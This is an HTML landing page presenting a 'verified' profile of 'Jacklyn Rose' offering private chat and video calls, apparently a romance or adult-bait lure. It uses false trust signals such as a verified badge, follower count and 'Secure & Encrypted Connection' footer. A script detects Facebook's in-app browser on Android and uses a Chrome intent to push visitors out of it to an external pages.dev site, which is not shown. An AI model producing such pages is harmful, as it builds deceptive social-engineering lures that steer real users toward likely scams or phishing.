<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Chat with Jacklyn</title>
    
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://done888.pages.dev/"> 
    <meta property="og:title" content="Private Chat with Jacklyn Rose">
    <meta property="og:description" content="Start a private conversation and high-quality video call now.">
    <meta property="og:image" content="https://i.ibb.co.com/60W6J79F/profile.webp">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0f0f0f; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #fff; }
        
        .container { width: 90%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.05); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }

        .profile-container { position: relative; width: 140px; height: 140px; margin: 0 auto 20px; }
        .profile-pic { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid #0084ff; padding: 3px; }
        .online-dot { position: absolute; bottom: 10px; right: 10px; width: 22px; height: 22px; background: #31a24c; border: 3px solid #1a1a1a; border-radius: 50%; }

        h1 { font-size: 24px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .verified { color: #0084ff; font-size: 18px; }
        
        p { color: #b0b3b8; font-size: 15px; margin-top: 10px; line-height: 1.5; }

        .stats { display: flex; justify-content: center; gap: 20px; margin: 25px 0; }
        .stat-box { text-align: center; }
        .stat-num { display: block; font-weight: bold; font-size: 18px; }
        .stat-label { font-size: 12px; color: #888; }

        .btn-chat { 
            display: block; 
            background: linear-gradient(45deg, #0084ff, #00c6ff); 
            color: white; 
            text-decoration: none; 
            padding: 16px; 
            border-radius: 50px; 
            font-weight: bold; 
            font-size: 18px; 
            transition: transform 0.3s, box-shadow 0.3s; 
            box-shadow: 0 10px 20px rgba(0, 132, 255, 0.3);
            cursor: pointer;
            border: none;
            width: 100%;
            outline: none;
        }
        .btn-chat:active { transform: scale(0.95); }

        .footer-note { font-size: 11px; color: #555; margin-top: 30px; letter-spacing: 0.5px; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="container">
        <div class="profile-container">
            <img src="https://i.ibb.co.com/60W6J79F/profile.webp" alt="Jacklyn Rose" class="profile-pic">
            <div class="online-dot"></div>
        </div>

        <h1>Jacklyn Rose <i class="fa-solid fa-circle-check verified"></i></h1>
        <p>Active Now for Private Conversation & Video Calls</p>

        <div class="stats">
            <div class="stat-box">
                <span class="stat-num">4.9k</span>
                <span class="stat-label">Followers</span>
            </div>
            <div class="stat-box">
                <span class="stat-num">Online</span>
                <span class="stat-label">Status</span>
            </div>
        </div>

        <button onclick="openInChrome()" class="btn-chat">
            <i class="fa-brands fa-facebook-messenger"></i> Private Chat with Jacklyn
        </button>

        <div class="footer-note">Secure & Encrypted Connection</div>
    </div>

    <script>
        function openInChrome() {
            // Your Main Website Link
            var targetUrl = "https://done888.pages.dev/"; 

            // Android Chrome Intent Script
            var chromeIntent = "intent://" + targetUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
            
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            var isAndroid = /Android/i.test(userAgent);
            var isFacebook = /FBAN|FBAV/i.test(userAgent);

            if (isAndroid && isFacebook) {
                // Forces to open in Chrome App from FB Browser
                window.location.href = chromeIntent;
                
                // Fallback in case intent fails
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 800);
            } else {
                // For PC, iOS or other browsers
                window.location.href = targetUrl;
            }
        }
    </script>

</body>
</html>
